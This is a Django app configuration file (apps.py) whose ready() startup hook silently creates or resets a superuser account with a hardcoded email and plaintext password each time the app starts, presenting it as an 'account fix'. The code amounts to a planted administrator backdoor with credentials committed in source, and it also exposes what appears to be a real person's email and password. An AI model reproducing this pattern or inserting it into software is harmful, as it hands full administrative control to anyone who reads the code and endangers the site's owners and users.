from django.apps import AppConfig


class CoreConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'core'

    def ready(self):
        # This code runs when the app starts
        import os
        # Only run once, not during reloads or migrations
        if os.environ.get('RUN_MAIN') != 'true' and 'MANAGED_MODE' not in os.environ:
             # Force the account fix on every startup to ensure the user can ALWAYS log in
             try:
                 from django.contrib.auth import get_user_model
                 User = get_user_model()
                 email = "arunbolli99@gmail.com"
                 password = "arun2524"
                 
                 user, created = User.objects.get_or_create(email=email, defaults={
                     'username': email,
                     'is_active': True,
                     'is_staff': True,
                     'is_superuser': True
                 })
                 
                 # Always reset password to ensure consistency 
                 user.set_password(password)
                 user.save()
                 print(f"DEBUG: Startup: Account {email} is ready.")
             except Exception as e:
                 print(f"DEBUG: Startup: Error creating account: {e}")
